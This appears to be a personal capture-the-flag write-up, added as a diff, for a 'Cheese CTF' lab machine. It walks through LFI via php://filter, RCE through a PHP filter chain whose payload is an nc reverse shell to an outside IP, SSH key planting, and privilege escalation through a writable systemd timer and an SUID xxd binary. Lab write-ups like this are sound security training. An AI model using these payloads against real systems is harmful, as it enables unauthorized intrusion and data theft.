@@ -1,0 +1,81 @@
+Cheese CTF
+
+10.10.13.168
+
+nmap scan seems to thint that every single port is open (me issue?)
+
+however just putting the ip into my browser brings me to a site on port 80
+
+a ffuf directory scan seems unconclusive, however a fuzzing of the files on the page reveals a couple things that could be important.
+
+we have:
+/messages.html
+/users.html
+/login.php
+/orders.html
+
+
+/messages.html - takes us to a weird page..
+
+/secret-script.php?file=php://filter/resource=supersecretmessageforadmin
+
+'if you know, you know :D'
+
+lets try a LFI exploit on this...
+
+http://10.10.13.168/secret-script.php?file=php://filter/resource=../../../../etc/passwd
+
+works!
+we have the /etc/passwd
+
+comte:x:1000:1000:comte:/home/comte:/bin/bash
+
+i am having manually scan each port to see if its real
+
+after PLENTYFUL OF RESEARCH
+
+i now understand that PHP filters can be exoploited to execute code on a target system
+
+https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
+https://github.com/synacktiv/php_filter_chain_generator
+
+# Using the exploit discoved in the links above, we can generate a php filter payload using the script above, put the payload into the URL  
+
+http://10.10.13.168/secret-script.php?file=*GENERATE_PAYLOAD*
+
+which will return whatever payload  we crafted, for example using the php code below, we put this into the php filter payload generator and wham... using the filter created we run code on the victim machine and get the first flag.
+
+using the payload...
+
+python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.93.140 9999 >/tmp/f"); ?>
+
+we can start a listener on port 9999 and run 
+
+curl -s "http://10.10.13.168/secret-script.php?file=$(cat payload.txt)"
+
+we have a shell..
+
+wget linpeas and run it..
+
+
+'You have write privileges over /etc/systemd/system/exploit.timer'
+
+if we can write to the timer, sure we can make it run whenever we want...
+
+before that, lets get a real shell and the user flag.
+
+in /home/comte/ we can read .ssh/authroized_keys
+
+which means we can slap our own public key in there and ssh in
+
+after sshing in we see we run the timer previously found as sudo (sudo -l)
+we can edit the timer and make it run as it currently doesnt have a run time set
+
+in the service the timer is for, 'xxd' is copied to /opt/xxd and getting its permissions changed by root to 'chmod +sx' that enables the executable to be run as the user who does '+s'!!
+
+which means that 'xxd' is executable as root. checking gtfobins allows us to see we can read files using this method!! 
+
+so after setting up the service to run, letting it run and then executing the commands from gtfobins on xxd we can read the root flag and any other files required with root permissions!!
+
+NOTE TO SELF:
+ALWAYS GET TO USER LEVEL (CHECK .SSH IF NO PASSWORD AVAILABLE)
